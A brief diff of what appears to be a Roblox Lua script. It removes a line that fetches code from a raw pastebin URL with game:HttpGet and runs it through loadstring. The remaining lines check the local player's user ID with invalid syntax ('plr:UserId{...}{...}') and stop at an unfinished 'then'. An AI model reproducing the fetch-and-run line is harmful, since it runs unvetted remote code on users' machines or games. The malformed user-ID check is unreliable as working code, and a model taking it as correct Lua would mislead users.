@@ -1,4 +1,3 @@
-loadstring(game:HttpGet(("https://pastebin.com/raw/MahxFag6"),true))()
 local plr = game:GetService("Players").LocalPlayer
 if plr:UserId{354429433}{2935773828}
 then
